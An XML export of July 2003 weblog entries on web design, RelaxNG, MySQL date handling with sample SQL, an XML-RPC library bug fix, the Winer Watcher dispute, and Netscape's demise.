		<field name="title">Independent Days on Daring Fireball</field>
		<field name="slug">independentDays</field>
		<field name="body">&lt;p&gt;Daring Fireball: &lt;a href=&quot;http://daringfireball.net/2003/07/independent_days.html&quot;&gt;Independent Days&lt;/a&gt;. A sprawling essay that covers web design principles, corporate vs. independent sites, Mac punditry and the justification for adding Google Ads to a weblog. Well worth a read. I particularly liked this quote, although it was more of a side-point than a key point of the article:&lt;/p&gt;

&lt;blockquote cite=&quot;http://daringfireball.net/2003/07/independent_days.html&quot;&gt;&lt;p&gt;
Less markup. Less scripting. Fewer navigation elements. Fewer colors. Fewer graphics. Omit needless words. This is how you make a good web site. I know this for a fact.&lt;/p&gt;

&lt;p&gt;Such design goals, however worthy, are notoriously difficult to sell to clients. A good web site costs a lot of money, and for a lot of money, most clients want a lot of web site. Lots of scripts. Lots of graphics. Lots of needless words.&lt;/p&gt;
&lt;/blockquote&gt;
</field>
		<field name="created">2003-07-09 11:12:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1084</field>
		<field name="title">Marketing for Geeks</field>
		<field name="slug">marketingForGeeks</field>
		<field name="body">&lt;p&gt;This is excellent: &lt;a href=&quot;http://software.ericsink.com/Act_Your_Age.html&quot;&gt;Marketing for Geeks&lt;/a&gt;, a series of articles (three at the moment) by Eric Sink. I've never really been interested in marketing but Eric got me hooked with  geek friendly examples such as Paint Shop Pro and CityDesk and I ended up learning a great deal. The writing style is similar to that of Joel Spolsky, so if you enjoy &lt;a href=&quot;http://www.joelonsoftware.com/&quot;&gt;Joel on Software&lt;/a&gt; you'll certainly enjoy this.&lt;/p&gt;</field>
		<field name="created">2003-07-09 13:09:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1085</field>
		<field name="title">Implementing Text Editors</field>
		<field name="slug">implementingTextEditors</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://traumwind.de/blog/?detail=2003-07-09_10-27&quot; title=&quot;The Craft of writing Texteditors&quot;&gt;Martin Spernau&lt;/a&gt;, two useful resources on writing text editors. &lt;a href=&quot;http://www.finseth.com/~fin/craft/&quot;&gt;The Craft of Text Editing&lt;/a&gt; appears to be the definitive work on the subject, and is a whole book made available online with permission from the publishers as it is no longer available in print. &lt;a href=&quot;http://www.bluemug.com/research/text.pdf&quot;&gt;Writing a Simple Word Processor&lt;/a&gt; (&lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt;) is a more recent paper with excellent overviews of the data structures and algorithms used in modern editing widgets.&lt;/p&gt;</field>
		<field name="created">2003-07-09 13:49:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1086</field>
		<field name="title">Adaptive Path Redesign</field>
		<field name="slug">adaptivePathRedesign</field>
		<field name="body">&lt;p&gt;Doug Bowman and Adaptive Path have launched the redesign of the &lt;a href=&quot;http://www.adaptivepath.com/&quot;&gt;Adaptive Path site&lt;/a&gt;. It's well worth exploring: the site looks gorgeous, and is a great example of best practise structural markup, &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; and web standards compliance. Doug has &lt;a href=&quot;http://www.stopdesign.com/log/2003/07/09/the_new_path.html&quot; title=&quot;The New Path&quot;&gt;an overview&lt;/a&gt; of the highlights of the new design, which includes a brief explanation of the brilliant &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; double rollover effects used for the team photos on the home page.&lt;/p&gt;</field>
		<field name="created">2003-07-09 14:45:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1087</field>
		<field name="title">Terms and Conditions</field>
		<field name="slug">termsAndConditions</field>
		<field name="body">&lt;p&gt;So, I signed up for an &lt;acronym title=&quot;America OnLine&quot;&gt;AOL&lt;/acronym&gt; Instant Messenger account today. While it was relatively painless, I did get a chuckle out of the terms of use attached to the Instant Messenger installer:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;
2. Restrictions on Use. You may not create or use any software other than the Software provided by AOL to enter your screen name and password or to access the Service, without the express written authorization of AOL. You may not modify, reverse engineer, decompile or disassemble the Software or otherwise attempt to derive its source code, or in any way ascertain, decipher, or obtain the communications protocol for accessing the Service.&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;You may not block, disable or otherwise affect any advertising, advertisement banner window, links to other sites and services, or other features that constitute an integral part of the Software and the Service. You may not incorporate, integrate or otherwise include the Software or any portion thereof (including the communications protocols) into any software, program or product that communicates, accesses, or otherwise connects with the Service or any other instant messaging, Internet, or online service.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;I guess that not only outlaws Trillian, Gaim and so on but it also bans browsers with built in pop-up blockers, such as Mozilla, Firebird... and &lt;acronym title=&quot;America OnLine&quot;&gt;AOL&lt;/acronym&gt;'s own widely advertised &lt;acronym title=&quot;America OnLine&quot;&gt;AOL&lt;/acronym&gt; 8 software.&lt;/p&gt;</field>
		<field name="created">2003-07-10 00:12:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1088</field>
		<field name="title">Compact XML Schemas with Relax NG</field>
		<field name="slug">compactSchemas</field>
		<field name="body">&lt;p&gt;Tim Bray has &lt;a href=&quot;http://www.tbray.org/ongoing/When/200x/2003/07/09/PieSchema01&quot;&gt;cooked up&lt;/a&gt; a RelaxNG schema for the 0.1 Necho/Pie/Fecho/!Echo snapshot (they really need to hurry up and decide on a name). I had never looked at RelaxNG before, although I had vaguely picked up that it was a lot nicer than the &lt;acronym title=&quot;World Wide Web Consortium&quot;&gt;W3C&lt;/acronym&gt;'s &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; Schema format. Tim has used RelaxNG Compact, a shorthand method of writing schemas that uses a curly-braces style language instead of &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;. It's suddenly got me &lt;em&gt;very&lt;/em&gt; interested - the compact format is instantly readable and looks a lot more efficient to use than &lt;acronym title=&quot;Document Type Definition&quot;&gt;DTD&lt;/acronym&gt;s or an &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; schema language. Best of all, there are tools to instantly convert compact syntax in to a full RelaxNG &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; schema, and then convert that in to &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; Schema (should you want to do so). The &lt;a href=&quot;http://www.relaxng.org/compact-tutorial-20030326.html&quot;&gt;Compact Syntax tutorial&lt;/a&gt; gives a good overview of how the compact syntax works. Now if only there was a Relax NG validation tool in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;...&lt;/p&gt;</field>
		<field name="created">2003-07-10 13:37:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1089</field>
		<field name="title">Clearout</field>
		<field name="slug">clearout</field>
		<field name="body">&lt;ul&gt;
 &lt;li&gt;Tristan Louis' &lt;a href=&quot;http://www.tnl.net/blog/entry/RSS2Necho&quot;&gt;RSS to Necho convertor&lt;/a&gt; puts paid to the idea that the success of one format will be detrimental to the usefulness of the other.&lt;/li&gt;
 &lt;li&gt;O'Reilly's RegExp Power series (&lt;a href=&quot;http://www.perl.com/pub/a/2003/06/06/regexps.html&quot; title=&quot;Regexp Power&quot;&gt;part one&lt;/a&gt; and &lt;a href=&quot;http://www.perl.com/pub/a/2003/07/01/regexps.html&quot; title=&quot;Power Regexps, Part II&quot;&gt;part two&lt;/a&gt;) demonstrate some powerful tricks for use with Perl compatible regular expressions.&lt;/li&gt;
 &lt;li&gt;Norman Walsh explains &lt;a href=&quot;http://norman.walsh.name/2003/07/02/conneg&quot;&gt;Content Negotiation&lt;/a&gt; and some of the pitfalls with modern browser implementations.&lt;/li&gt;
 &lt;li&gt;So &lt;a href=&quot;http://forum.digitalspy.co.uk/board/t/51809/11f30324974ff57f0779a36abf0b7ebdds.html&quot; title=&quot;No more Mister Biffo&quot;&gt;that's&lt;/a&gt; what happened to Digitiser. See also a &lt;a href=&quot;http://www.lynn3686.freeserve.co.uk/digitiser.html&quot;&gt;Digitiser Tribute&lt;/a&gt; and a &lt;a href=&quot;http://www.geocities.com/flyingturduk/biffo.html&quot;&gt;Mr Biffo interview&lt;/a&gt; from 2001 for background information. I cuss you bad.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.resort.com/~prime8/Orwell/patee.html&quot;&gt;George Orwell: Politics and the English Language&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Clay Shirky: &lt;a href=&quot;http://www.shirky.com/writings/group_enemy.html&quot;&gt;A Group Is Its Own Worst Enemy&lt;/a&gt;. The title is misguiding; this is an essay about how online groups behave and how to look after them.&lt;/li&gt;
 &lt;li&gt;A &lt;a href=&quot;http://jakarta.apache.org/commons/httpclient/&quot;&gt;Java HttpClient Class&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Some good stuff on Boxes and Arrows: &lt;a href=&quot;http://www.boxesandarrows.com/archives/ten_quotable_moments_challenges_and_responses_for_ui_designers.php&quot;&gt;Ten Quotable Moments: Challenges and Responses for UI Designers&lt;/a&gt; and &lt;a href=&quot;http://www.boxesandarrows.com/archives/views_and_forms_principles_of_task_flow_for_web_applications_part_1.php&quot;&gt;Views and Forms: Principles of Task Flow for Web Applications (Part 1)&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;&lt;a href=&quot;http://www.lynnparkplace.org/vot/archives/accessibility/000050.html&quot;&gt;Inside our notions of &quot;document&quot;&lt;/a&gt; and &lt;a href=&quot;http://www.lynnparkplace.org/vot/archives/accessibility/000051.html&quot;&gt;Inside our documents II - the Runoff model&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;5 days worth of XSLT observations from Simon St. Laurent: &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/3339&quot; title=&quot;XSLT Training, Day 1&quot;&gt;One&lt;/a&gt;, &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/3345&quot; title=&quot;XSLT Training, Day 2&quot;&gt;Two&lt;/a&gt;, &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/3350&quot; title=&quot;Labels vs. Types and Other Culture Clashes&quot;&gt;Three&lt;/a&gt;, &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/3356&quot; title=&quot;Switching Gears - XSL-FO, Day 1&quot;&gt;Four&lt;/a&gt;, &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/3363&quot; title=&quot;XSL-FO, Day 2&quot;&gt;Five&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Windows programming with open source tools: &lt;a href=&quot;http://www.mingw.org/&quot;&gt;Minimalist GNU For Windows&lt;/a&gt; and &lt;a href=&quot;http://webclub.kcom.ne.jp/ma/colinp/win32/&quot;&gt;Win32 Programming with GNU C and C++&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2003-07-10 13:52:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1090</field>
		<field name="title">Stored procedures in MySQL?</field>
		<field name="slug">mysqlStoredProcedures</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://afongen.com/blog/archives/000506.php&quot; title=&quot;Stored procedures in MySQL&quot;&gt;Sam Buchanan&lt;/a&gt;, it looks like MySQL &lt;a href=&quot;http://www.oreillynet.com/pub/wlg/3476&quot; title=&quot;OSCON 2003 Day Three&quot;&gt;might get stored procedure support&lt;/a&gt; soon in a big way:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.oreillynet.com/pub/wlg/3476&quot;&gt;&lt;p&gt;
Brian Aker, fresh on his new job as Senior Architect at MySQL, shocked the world (or, at least, me) when he announced that he'd embedded Perl in MySQL and was using it for stored procedures a couple of years ago. Of course, it did segfault rather often. Fortunately, it's highly mature now. In his talk on &quot;Making MySQL Do More&quot;, Brian showed the embedded function API. You can write new functions for MySQL in Perl, Python, PHP, and Java.
&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-07-10 23:24:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1091</field>
		<field name="title">Storing Dates in MySQL</field>
		<field name="slug">storingDatesInMySQL</field>
		<field name="body">&lt;p&gt;DevShed have a new article on &lt;a href=&quot;http://www.devshed.com/Server_Side/MySQL/DateArithmetic/&quot;&gt;Date Arithmetic With MySQL&lt;/a&gt;, which acts as a kind of missing manual for MySQL's powerful date arithmetic functions. It reminded me of something I've been meaning to write about for some time: my thoughts on storing dates in a &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; application that uses a MySQL backend&lt;/p&gt;

&lt;p&gt;MySQL comes with a full featured &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt; for handling dates, and &lt;a href=&quot;http://www.mysql.com/doc/en/DATETIME.html&quot; title=&quot;MySQL Manual: 6.2.2.2 The DATETIME, DATE, and TIMESTAMP Types&quot;&gt;several column types&lt;/a&gt; for use with the date and time functions. Unfortuantely, none of the available column types map directly to &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s internal format for handling dates, the Unix timestamp (an integer value recording the seconds since midnight on January 1st, 1970). I have seen many &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; applications where people have used a MySQL integer field to store date information as a Unix timestamp. While this works, it is inadvisable as it prevents you from using any of MySQLs powerful built in date handling abilities.&lt;/p&gt;

&lt;p&gt;Instead, you can use MySQL's UNIX_TIMESTAMP() and FROM_UNIXTIME() functions to convert Unix timestamps to MySQL date types as part of your &lt;acronym title=&quot;Structured Query Language&quot;&gt;SQL&lt;/acronym&gt; queries. This allows you to use MySQL's internal date manipulation features without having to manually convert MySQL dates to &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; timestamps in your &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; applications. I usually use DATETIME fields to store timestamps, but the conversion functions work for any of MySQL's date storage types.&lt;/p&gt;

&lt;p&gt;Here's a sample select query:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;sql&quot;&gt;
SELECT 
  entries.*, UNIX_TIMESTAMP(added) as unixtime
FROM 
  enries
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Assuming added is a DATETIME column, this adds an additional field to each returned row called 'unixtime', containing an integer that can be passed straight to &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s handy &lt;code class=&quot;php&quot;&gt;date()&lt;/code&gt; function for formatting. Going the other way:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;sql&quot;&gt;
INSERT INTO 
  entries
SET  
  title = 'The title', 
  added = FROM_UNIXTIME(1057941242),
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The second example is less useful, but at least demonstrates the function. Incidentally, when inserting things in to a MySQL database with the current time it's generally a good idea to use MySQL's &lt;code class=&quot;sql&quot;&gt;NOW()&lt;/code&gt; function to set the time, like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;sql&quot;&gt;
INSERT INTO 
  entries
SET  
  title = 'The title', 
  added = NOW(),
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Doing this increases consistency as it means that should you ever have a setup with multiple web servers talking to a single database server the database server's time will be used as the standard, rather than potentially introducing errors from differing clocks on the server machines.&lt;/p&gt;</field>
		<field name="created">2003-07-11 17:40:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1092</field>
		<field name="title">RSS Links</field>
		<field name="slug">rssLinks</field>
		<field name="body">&lt;p&gt;Here's one for budding &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; historians: Ken MacLeod's &lt;a href=&quot;http://bitsko.slc.ut.us/blog/2003/06/11/rss-links-0dot3&quot; title=&quot;RSS Links 0.3 released&quot;&gt;RSS Links&lt;/a&gt; is a collection of links relevant to the development of &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; between March 15, 1999 and August 14, 2000. Ken also provides a &lt;a href=&quot;http://bitsko.slc.ut.us/cgi-bin/rss-links&quot;&gt;distilled list&lt;/a&gt; of the more important discussion points. Combine that with Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/archives/2002/09/06/history_of_the_rss_fork.html&quot;&gt;History of the RSS Fork&lt;/a&gt; (covering July 2000 to November 2000) and you've got more knowledge about &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; history than anyone could possible want to know.&lt;/p&gt;</field>
		<field name="created">2003-07-11 18:43:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1093</field>
		<field name="title">Sitting nervously on the fence</field>
		<field name="slug">winerWatcher</field>
		<field name="body">&lt;p&gt;Today's hot topic is the &lt;a href=&quot;http://diveintomark.org/ww/&quot;&gt;Winer Watcher&lt;/a&gt;, Mark Pilgrim's new tool that tracks and highlights edits made to Dave Winer's &lt;a href=&quot;http://www.scripting.com/&quot;&gt;Scripting News&lt;/a&gt;. The blogosphere is pretty much evenly split on this: some people think it is a blatant attack on Dave Winer, tantamount o blogger bullying, while others see it as a neat technical solution to a very real problem.&lt;/p&gt;

&lt;p&gt;I've been using &lt;a href=&quot;http://www.technorati.com/cosmos/links.html?rank=&amp;amp;url=http%3A%2F%2Fdiveintomark.org%2Fww%2F&amp;amp;sub=Get+Link+Cosmos&quot; title=&quot;Inbound Links to http://diveintomark.org/ww&quot;&gt;Technorati&lt;/a&gt; to follow the discussion, but the real action is in the comments attached to &lt;a href=&quot;http://www.docuverse.com/blog/donpark/2003/07/10.html#a701&quot; title=&quot;Mark Pilgrim Stalks Dave Winer&quot;&gt;this entry&lt;/a&gt; by Don Park. To save you having to read all 80+ comments, here are some highlights (I've tried to pick out entries which represent the different opinions on display). Please note that by the very nature of this post I am quoting these people out of context. If that makes you uncomfortable, read &lt;a href=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;the whole thread&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;Már Örlygsson&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;&lt;p&gt;
IMO Mark is acting like a school-yard bully, picking on someone he feels will make him look big. Hrrmphf! (Surely Mark has every right to dislike Dave - or anyone else for that matter - but constantly picking on people is just plain nasty and can have terrible psychological effects on even the strongest people.)
&lt;/p&gt;&lt;/blockquote&gt;

&lt;h4&gt;Greg Ritter&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;&lt;p&gt;
There's editing posts and then there's what I call &quot;de-publishing.&quot; &lt;a href=&quot;http://www.tenreasonswhy.com/weblog/archives/2003/07/10/the_ethics_of_depublishing.html&quot;&gt;http://www.tenreasonswhy.com/weblog/archives/2003/07/10/the_ethics_of_depublishing.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;De-publishing is when an author deletes or substantively changes a post without any sort of retraction or notice that the change has taken place. Note that I'm talking about *substantive* changes -- not fixing grammer or spelling or text formatting, but changes that affect the meaning or impact of the post.&lt;/p&gt;

&lt;p&gt;Winer regularly writes something inflammatory and then later tries to &quot;erase&quot; it from existence by de-publishing it. I disapprove of that because with publishing should come accountability.&lt;/p&gt;

&lt;p&gt;Mark Pilgrim is using Winer's RSS feeds to track the &quot;virtual paper trail&quot; to reveal the kind of de-publishing that takes place on Scripting News.&lt;/p&gt;

&lt;p&gt;I find de-publishing far more unethical and detrimental to the blogosphere (especially when it comes from such a prominent blogger as Winer) than what Mark Pilgrim is doing. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4&gt;Blake Winton&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;&lt;p&gt;
Am I the only person here who finds the Winer Watcher a fascinating look into the mind of a popular and experienced weblogger as he writes his posts? I read it compulsively, and find myself thinking &quot;What changed there? Why did he rephrase that particular statement? How is the new phrasing better than the old?&quot;.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;h4&gt;Dave Winer&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;&lt;p&gt;
 &quot;there's never a concept of a final posting&quot;&lt;/p&gt;

&lt;p&gt;Not true. 10PM is the final, that's when the people who subscribe via email get their copy of Scripting.&lt;/p&gt;

&lt;p&gt;BTW, I've deleted a few paragraphs as I'm writing this post. Think about it. Did I do something wrong? That's how ridiculous this discussion is.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4&gt;Mark Pilgrim&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;
&lt;p&gt;1. Diff-like highlighting of changes within posts is an incredibly useful feature that all news aggregators should support.&lt;/p&gt;

&lt;p&gt;2. Dave's bandwidth claim is bogus. Winer Watcher uses a system of distributed mirrors and never touches scripting.com directly. If WW ceased to exist, Dave's bandwidth bill would change by precisely zero.&lt;/p&gt;

&lt;p&gt;3. Dave's copyright claim is bogus. Winer Watcher is no more infringing than these existing syndication services:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.oreillynet.com/meerkat/?c=584&amp;amp;t=ALL&quot;&gt;http://www.oreillynet.com/meerkat/?c=584&amp;amp;t=ALL&lt;/a&gt; &lt;a href=&quot;http://newsisfree.com/sources/info/336/&quot;&gt;http://newsisfree.com/sources/info/336/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;[...]&lt;/p&gt;

&lt;p&gt;For the record, Winer Watcher was started because Dave wrote a series of posts totally lashing out at Blogger, Movable Type, Google, Tim Bray, and myself, and then edited them within hours to erase all traces of his own slanderous flaming. This kind of slander is NOT ACCEPTABLE UNDER ANY CIRCUMSTANCES, and the fact that he seems to know this at some level and edits/deletes it later only makes it worse. WW tracks this kind of Orwellian rewriting of history and displays it. It would be more useful if it could distinguish between a relevant edit and a typo correction, but sometimes even a single word is relevant, so I don't know how it could tell.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4&gt;Bill Brown&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;&lt;p&gt;Dave: you're free to delete anything you want and do whatever you want on your blog. It's not wrong, it's just a pain in the ass for your regular readers. I might read in the morning and revisit by afternoon to a completely different page, one who's mood and tone have changed thoroughly. I personally don't like that because I'm hardly confident in my previous recollection -- it's unsettling.&lt;/p&gt;&lt;/blockquote&gt;

&lt;h4&gt;Mark Pilgrim&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;
&lt;p&gt;For the record, here is a Scripting News post he posted on July 8 2003 and subsequently deleted (but Winer Watcher caught it):&lt;/p&gt;

&lt;p&gt;&quot;&quot;&quot; There's more to the story, in re Mark's control of the RSS validator. It seems people who accuse me of controlling RSS may have missed that Mark and Sam have actually been exerting silent control by changing key aspects of the validator, without telling anyone they were doing it. Mark's flaming in this thread, which caught the attention of quite a few people as being extrordinarily mean, even for Mark, was in exactly the area he wouldn't want you to look in the validator. I want to disclaim that I control RSS, folks, because since the RSS 2.0 spec was frozen, it was Mark and Sam that controlled it, not me. Ironically, no one knew. &quot;&quot;&quot;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4&gt;Rogers Cadenhead&lt;/h4&gt;

&lt;blockquote cite=&quot;http://radiocomments.userland.com/comments?u=112479&amp;amp;p=701&amp;amp;link=http%3A%2F%2Fwww.docuverse.com%2Fblog%2Fdonpark%2F2003%2F07%2F10.html%23a701&quot;&gt;&lt;p&gt;
Regardless of the legality, though, it seems particularly ill-timed. If the Echo Project is going to move anyone beyond the intractable political fights over RSS, it's counterproductive to find novel new ways to piss each other off.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The thread then devolves in to an argument about whether Mark's tool is a copyright infringment or is protected by &quot;fair use&quot;, at which point I tuned out (there are good arguments either way on that one).&lt;/p&gt;

&lt;p&gt;Having thought things over, I love the functionality of the tool (Dave's edits have caught me out on more than one occasion) but I am uncomfortable with the way it is being used to attack Dave's personality. &lt;a href=&quot;http://www.rebeccablood.net/handbook/excerpts/weblog_ethics.html#deliberate&quot;&gt;Point 4&lt;/a&gt; of Rebecca Blood's guide to weblog ethics is worth reading here: editing entries is best avoided, and when they are edited they should be accompanied by an addendum. Weblogs are a personal medium, but that does not absolve people from responsibility for what they have written. My own policy is to clearly mark any alterations I make to posts (with the exception of spelling mistakes), and I usually avoid making any edits at all. Dave's policy is to edit his blog &quot;live&quot; until 10pm. when the day's entries become frozen. It is not so much this policy that is under fire as the scale of Dave's edits, and the nature of the material he later deletes.&lt;/p&gt;

&lt;p&gt;If Winer Watcher was available as a standalone tool, I would use it. As a public resource, it does feel a little below the belt.&lt;/p&gt;
</field>
		<field name="created">2003-07-11 21:02:11</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1094</field>
		<field name="title">Minor bug fix in IXR</field>
		<field name="slug">minorBugFix</field>
		<field name="body">&lt;p&gt;I've fixed a small but vital bug in the &lt;a href=&quot;http://scripts.incutio.com/xmlrpc/&quot;&gt;Incutio XML-RPC library&lt;/a&gt;. The library was causing errors when certain unicode characters were used in strings. This is because I was using &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s &lt;code class=&quot;php&quot;&gt;htmlentities()&lt;/code&gt; function to encode strings before transmission. This escapes all of the characters that need escaping (&amp;lt;, &amp;gt;, &amp;amp;, &quot; and ') but also escapes a number of other characters that have an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; entity equivalent. The problem is that these additional entities are defined in &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; but not in &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt;, so &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; parsers were choking on them when they tried to parse the resulting message. I've fixed the bug now by switching to using &lt;code class=&quot;php&quot;&gt;htmlspecialchars()&lt;/code&gt; instead. Thanks to the several people who reported this one (it took me a while to figure out) and to Marc Logemann who's &lt;a href=&quot;http://www.logemann.info/day/archives/000021.html&quot; title=&quot;The Incutio XML-RPC Library for PHP&quot;&gt;blog entry&lt;/a&gt; finally helped me crack it.&lt;/p&gt;</field>
		<field name="created">2003-07-11 21:20:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1095</field>
		<field name="title">In Germany</field>
		<field name="slug">germany</field>
		<field name="body">&lt;p&gt;I'm in Germany for a week. Updates may be sparse.&lt;/p&gt;</field>
		<field name="created">2003-07-14 17:41:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1096</field>
		<field name="title">Netscape R.I.P.</field>
		<field name="slug">netscapeRIP</field>
		<field name="body">&lt;p&gt;Chances are you've heard this already, but &lt;a href=&quot;http://daniel.glazman.free.fr/weblog/newarchive/2003_07_13_glazblogarc.html#s105830146977534319&quot; title=&quot;R.I.P.&quot;&gt;Netscape is no more&lt;/a&gt;. MozillaZine are &lt;a href=&quot;http://mozillazine.org/talkback.html?article=3422&quot; title=&quot;AOL Cuts Remaining Mozilla Hackers&quot;&gt;reporting&lt;/a&gt; that &lt;q cite=&quot;http://mozillazine.org/talkback.html?article=3422&quot;&gt;AOL has cut or will cut the remaining team working on Mozilla in a mass firing and are dismantling what was left of Netscape (they've even pulled the logos off the buildings)&lt;/q&gt;. Today is a truly sad day.&lt;/p&gt;

